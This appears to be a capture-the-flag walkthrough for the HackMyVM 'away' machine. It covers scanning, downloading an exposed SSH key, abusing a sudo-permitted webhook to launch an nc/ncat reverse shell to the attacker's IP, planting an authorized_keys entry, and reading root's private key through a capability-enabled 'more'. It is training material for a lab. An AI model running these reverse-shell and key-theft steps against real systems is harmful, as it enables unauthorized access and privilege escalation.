### Write up for https://hackmyvm.eu/machines/machine.php?vm=away ###

## Walkthrough



```bash
sudo netdiscover -i <interface> -r <iprange>
```

```bash
ip=<machines ip>
url=http://$ip
```

```bash
nmap -v -T4 -p- -sC -sV -oN nmap.log $ip  
```

```bash
firefox $url &
```

Login: tula 

```text
+--[ED25519 256]--+
|  . . =+. .o..   |
|   + +.+ . .o    |
|    = + + +  o   |
|     + B + o  o  |
|      = S o  .   |
|     = + o    .  |
|    + X o    .   |
|     O O. . . .  |
|    . E+.. . .   |
+----[SHA256]-----+
```



This gives us some clues,
A) The user tula
B) it indicates ed25519 ssh key

So lets check the web dir for id_ed25519
```bash
>>> curl $url/id_ed25519
```
```text
-----BEGIN OPENSSH PRIVATE KEY-----
deducted
0WrJZF
-----END OPENSSH PRIVATE KEY-----
```

```bash
>>> curl $url/id_ed25519 -o id_ed25519
```

```bash
chmod 600 id_ed25*
```

```bash
ssh tula@$ip -i id_ed25*
```

we need password.

after some failed attempts to crack the id_ed25519 i decided to check for the public key.

```bash
curl $url/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTsYR6Gg1apA+kuSgdtTkrrhhgskSJf  My passphrase is: T****deducted***ng
```

```bash
ssh tula@$ip -i id_ed25*
```


```bash
tula@away:~$ sudo -l
```
```text
Matching Defaults entries for tula on away:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
```

```text
User tula may run the following commands on away:
    (lula) NOPASSWD: /usr/bin/webhook
```
```bash
ls
cat user.txt
```

```bash
tula@away:~$ sudo -u lula webhook 
```
```text
[webhook] 2022/06/29 12:52:42 couldn't load any hooks from file!
aborting webhook execution since the -verbose flag is set to false.
If, for some reason, you want webhook to start without the hooks, either use -verbose flag, or -nopanic
```
```bash
tula@away:~$ sudo -u lula webhook -nopanic
```
^C
```bash
tula@away:~$ sudo -u lula webhook -verbose
```
```text
[webhook] 2022/06/29 12:52:52 version 2.6.9 starting
[webhook] 2022/06/29 12:52:52 setting up os signal watcher
[webhook] 2022/06/29 12:52:52 attempting to load hooks from hooks.json
[webhook] 2022/06/29 12:52:52 couldn't load hooks from file! open hooks.json: no such file or directory
[webhook] 2022/06/29 12:52:52 serving hooks on http://0.0.0.0:9000/hooks/{id}
[webhook] 2022/06/29 12:52:52 os signal watcher ready
```

After some google search we found on this page https://library.humio.com/training/use-cases/webhook-script-example/

the following java script:
[
  {
    "id": "cleanup-webhook",
    "execute-command": "/var/scripts/cleanup.sh",
    "command-working-directory": "/tmp"
  }
]


```bash
tula@away:~$ cd /tmp 
tula@away:~$ pico webhook
```
edit the script to:
[
  {
    "id": "rs",
    "execute-command": "sh /tmp/rs.sh",
  }
]

on our attacking machine
```bash
>>> rsg 192.168.56.1 1234 nc  
```
NCAT REVERSE SHELL
```bash
ncat 192.168.56.1 1234 -e /bin/sh
```
Select your payload, press "l" to listen on port 1234 or enter to exit: l

on tula's terminal
```bash
tula@away:/tmp$ echo '#!/bin/bash' >> rs.sh
tula@away:/tmp$ echo 'nc 192.168.56.1 1234 -e /bin/bash' >> rs.sh
tula@away:/tmp$ chmod +x rs.sh
```

```bash
tula@away:/tmp$ sudo -u lula webhook -verbose -hooks /tmp/webhook 
```
```text
[webhook] 2022/06/29 13:04:25 version 2.6.9 starting
[webhook] 2022/06/29 13:04:25 setting up os signal watcher
[webhook] 2022/06/29 13:04:25 attempting to load hooks from /tmp/webhook
[webhook] 2022/06/29 13:04:25 found 1 hook(s) in file
[webhook] 2022/06/29 13:04:25   loaded: rs
[webhook] 2022/06/29 13:04:25 serving hooks on http://0.0.0.0:9000/hooks/{id}
[webhook] 2022/06/29 13:04:25 os signal watcher ready
```

lets visit that link
```bash
curl $url:9000/hooks/rs
```

we got rs

id
```text
uid=1001(lula) gid=1001(lula) grupos=1001(lula)
```


Method 1 (recommended)
```bash
cd ~ 
mkdir .ssh
chmod 755 .ssh
cd .ssh
```

```bash
echo 'ssh-ed25519 (YOUR KEY)' >> authorized_keys
```

```bash
chmod 644 authorized_keys
```

exit and ssh 

```bash
ssh lula@$ip
```

Method 2

Get Better shell envirorment 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty -a
```

```bash
stty raw -echo;fg
```
reset
xterm
```bash
stty rows (values from stty -a) cols (values from stty -a)
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
```


```bash
lula@away:~$ sudo -l
```

```text
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
```

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Its lse time
```bash
https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
cd /tmp
```
upload lse.sh
```bash
chmod +x lse.sh
```
./lse.sh -l 1 -i | more

[*] sec010 List files with capabilities.................................... yes!
```text
---
```
```bash
/usr/bin/more cap_dac_read_search=ep
```

```bash
lula@away:/tmp$ ls -alh /usr/bin/more
```
```text
-rwxrwx--- 1 root lula 59K ene 20 21:10 /usr/bin/more
```

since our machine is using id_ed25519 we asume that root is using the same.

```bash
lula@away:/tmp$ more /root/.ssh/id_ed25519 > id_root
```

```bash
lula@away:/tmp$ cat id_root 
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1
deducted
AwQ=
-----END OPENSSH PRIVATE KEY-----
```

```bash
lula@away:/tmp$ chmod 600 id_root 
lula@away:/tmp$ ssh root@localhost -i id_root 
```
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:eP8141ExfBNCFzEBtG43585nn3YMkwz/mpmMlzCHMSI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
```text
Linux away 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64
```

```text
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
```

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 17 11:14:38 2022
```text
root@away:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@away:~# cat ro*
HMVN (deducted) NI
```
